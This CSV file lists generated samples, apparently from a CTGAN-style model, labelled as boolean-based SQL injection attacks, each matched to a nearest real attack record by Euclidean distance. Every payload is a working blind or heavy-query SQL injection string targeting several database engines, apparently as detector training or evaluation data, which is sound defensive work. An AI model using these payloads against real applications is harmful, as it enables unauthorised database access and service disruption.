id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000014,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000143,5.858168106378443
CTGAN_000015,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000049,6.863807751505242
CTGAN_000016,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'pgyl'  =  'pgyl",nearest_attack_euclidean,R000112,4.844069107616194
CTGAN_000017,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000302,6.294572153276736
CTGAN_000018,attack,boolean,"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",nearest_attack_euclidean,R000296,7.711051354441662
CTGAN_000019,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000228,6.602334861068765
CTGAN_000020,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R000240,4.996678157781736
CTGAN_000021,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000028,6.307974257929928
CTGAN_000022,attack,boolean,"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000235,6.112786831117024
CTGAN_000023,attack,boolean,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,nearest_attack_euclidean,R000013,11.687547246489343
CTGAN_000024,attack,boolean,"1   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000216,5.219749884545114
CTGAN_000025,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000042,4.231735873852056
CTGAN_000026,attack,boolean,"1""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000146,3.995057189909033
CTGAN_000027,attack,boolean,"1'  )   as elnu where 5719  =  5719 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000281,4.619820500828391
CTGAN_000028,attack,boolean,"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",nearest_attack_euclidean,R000296,7.254230709534392
CTGAN_000029,attack,boolean,"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000045,5.4339442113085115
CTGAN_000030,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000162,5.490381130473931
CTGAN_000031,attack,boolean,-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R000310,6.007436464579668
CTGAN_000032,attack,boolean,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",nearest_attack_euclidean,R000046,6.599122450585646
CTGAN_000033,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000245,4.220486476466098
CTGAN_000034,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000246,5.667135795822545
CTGAN_000035,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000062,5.613137718318499
CTGAN_000036,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000203,6.144928465685246
CTGAN_000037,attack,boolean,"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000179,6.273680440351646
CTGAN_000038,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000093,6.621390618974774
CTGAN_000039,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000245,6.521068993033586
CTGAN_000040,attack,boolean,"1%'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000139,6.978937549440191
CTGAN_000041,attack,boolean,"1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo",nearest_attack_euclidean,R000177,4.937048418329852
CTGAN_000042,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000305,5.262983004793327
CTGAN_000043,attack,boolean,"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""gimc"" like ""gimc",nearest_attack_euclidean,R000040,6.028420779191251
CTGAN_000044,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R000114,5.337507991194016
CTGAN_000045,attack,boolean,"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000043,5.337376175677157
CTGAN_000046,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000162,7.858840908400158
CTGAN_000047,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000162,6.615504367492293
CTGAN_000048,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000162,5.6857342305980145
CTGAN_000049,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000063,8.092752535418345
CTGAN_000050,attack,boolean,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000178,8.21981446802098
CTGAN_000051,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R000255,6.078374699676979
CTGAN_000052,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",nearest_attack_euclidean,R000212,7.420023021964581
CTGAN_000053,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000059,5.18267253392908
CTGAN_000054,attack,boolean,"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000084,6.939096118391832
CTGAN_000055,attack,boolean,1'||  (  select 'xdzp' from dual where 5786  =  5786 and   (  3020  =  3020  )  *6703  )  ||',nearest_attack_euclidean,R000108,4.438559530215051
CTGAN_000056,attack,boolean,"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000045,8.54798880724638
CTGAN_000057,attack,boolean,-2036'  )   or   (  8459  =  8459  )  *4906 and   (  'hjeu'  =  'hjeu,nearest_attack_euclidean,R000254,9.317129486500628
CTGAN_000058,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R000237,6.229200028007875
CTGAN_000059,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000245,4.754488129326781
CTGAN_000060,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",nearest_attack_euclidean,R000069,6.497953767307356
CTGAN_000061,attack,boolean,1  )   where 5866  =  5866 and 4595  =  4595#,nearest_attack_euclidean,R000266,6.383727062611656
CTGAN_000062,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000245,7.1467449783588215
CTGAN_000063,attack,boolean,"1%""   )    )     )   and 3116  =  9088#",nearest_attack_euclidean,R000092,8.60939328724945
CTGAN_000064,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000062,7.125775892612156
CTGAN_000065,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000176,5.818368888555487
CTGAN_000066,attack,boolean,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,nearest_attack_euclidean,R000013,11.655340691987616
CTGAN_000067,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000302,5.772889691984127
CTGAN_000068,attack,boolean,"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000045,5.534940323179664
CTGAN_000069,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000042,6.17560448122966
CTGAN_000070,attack,boolean,"1%'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000139,4.859291695847378
CTGAN_000071,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R000192,5.62880775852702
CTGAN_000072,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000022,4.007387198972744
CTGAN_000073,attack,boolean,1  )   where 5866  =  5866 and 4595  =  4595#,nearest_attack_euclidean,R000266,6.196163497253267
CTGAN_000074,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000300,5.517731508057848
CTGAN_000075,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'jxqf' like 'jxqf",nearest_attack_euclidean,R000275,7.1398594057286004
CTGAN_000076,attack,boolean,"1'+  (  select wkay where 5476  =  5476 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000161,8.059759684010007
CTGAN_000077,attack,boolean,"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",nearest_attack_euclidean,R000087,5.942822077541353
CTGAN_000078,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000203,5.283900222951035
CTGAN_000079,attack,boolean,"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",nearest_attack_euclidean,R000087,6.8095634960604166
CTGAN_000080,attack,boolean,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000293,6.736270141785959
CTGAN_000081,attack,boolean,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",nearest_attack_euclidean,R000046,4.717999526132361
CTGAN_000082,attack,boolean,"-2568""  )   or   (  8459  =  8459  )  *4906 and   (  ""exyw""  =  ""exyw",nearest_attack_euclidean,R000241,7.7211664436916685
CTGAN_000083,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000245,4.897738155000132
CTGAN_000084,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000063,4.707622177843713
CTGAN_000085,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000134,4.943191670913467
CTGAN_000086,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000027,7.763794715121026
CTGAN_000087,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000162,7.493089707207461
CTGAN_000088,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000109,6.181378070081757
CTGAN_000089,attack,boolean,"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dwpa""  =  ""dwpa",nearest_attack_euclidean,R000282,5.968215940317235
CTGAN_000090,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000063,6.001569682248263
CTGAN_000091,attack,boolean,-2036'  )   or   (  8459  =  8459  )  *4906 and   (  'hjeu'  =  'hjeu,nearest_attack_euclidean,R000254,7.830943492608766
CTGAN_000092,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000245,4.615692855899833
CTGAN_000093,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000110,6.923465659258133
CTGAN_000094,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000245,5.246636375134438
CTGAN_000095,attack,boolean,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000178,7.086355245152701
CTGAN_000096,attack,boolean,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",nearest_attack_euclidean,R000046,5.1401854172671175
CTGAN_000097,attack,boolean,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,nearest_attack_euclidean,R000013,12.58914042395501
CTGAN_000098,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000295,5.186232249657168
CTGAN_000099,attack,boolean,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000178,5.5784648356090605
CTGAN_000100,attack,boolean,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,nearest_attack_euclidean,R000013,12.245643613715815
CTGAN_000101,attack,boolean,"1%""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000141,5.0437728383915035
CTGAN_000102,attack,boolean,"1%'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000230,5.717868908872172
CTGAN_000103,attack,boolean,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",nearest_attack_euclidean,R000085,8.15857304405069
CTGAN_000104,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000298,6.481857254992868
CTGAN_000105,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000140,4.837913846985929
CTGAN_000106,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000110,6.963396760010753
CTGAN_000107,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000245,5.198959102558791
CTGAN_000108,attack,boolean,"1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo",nearest_attack_euclidean,R000177,5.268495759897165
CTGAN_000109,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000245,6.008370169197099
CTGAN_000110,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000218,5.489911260956659
CTGAN_000111,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000245,3.793524306293706
CTGAN_000112,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo",nearest_attack_euclidean,R000103,4.799159145257242
CTGAN_000113,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000132,6.549323013740224
CTGAN_000114,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000049,7.054540586951042
CTGAN_000115,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000162,4.8956061108839
CTGAN_000116,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R000279,5.645317839840707
CTGAN_000117,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R000089,7.05048275791904
CTGAN_000118,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000276,3.845308606038807
CTGAN_000119,attack,boolean,"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000306,5.8959300775965335
CTGAN_000120,attack,boolean,"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",nearest_attack_euclidean,R000262,3.5832080022346773
CTGAN_000121,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000063,6.0165557678398836
CTGAN_000122,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R000237,5.125765571947875
CTGAN_000123,attack,boolean,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,nearest_attack_euclidean,R000013,13.634806093459897
CTGAN_000124,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R000192,5.286597030569038
CTGAN_000125,attack,boolean,-2223'   )    )    as mjwp where 8650  =  8650 or 7900  =  5838,nearest_attack_euclidean,R000284,5.295680355884811
CTGAN_000126,attack,boolean,"1'  )   as elnu where 5719  =  5719 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000281,6.159914910056019
CTGAN_000127,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000042,4.6817524479216654
CTGAN_000128,attack,boolean,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000178,5.595285705092997
CTGAN_000129,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000132,5.3602781000647015
CTGAN_000130,attack,boolean,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",nearest_attack_euclidean,R000023,5.557902312130809
CTGAN_000131,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000302,8.297094732292008
CTGAN_000132,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000265,6.847101308618497
CTGAN_000133,attack,boolean,"1%'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000264,5.195954681183612
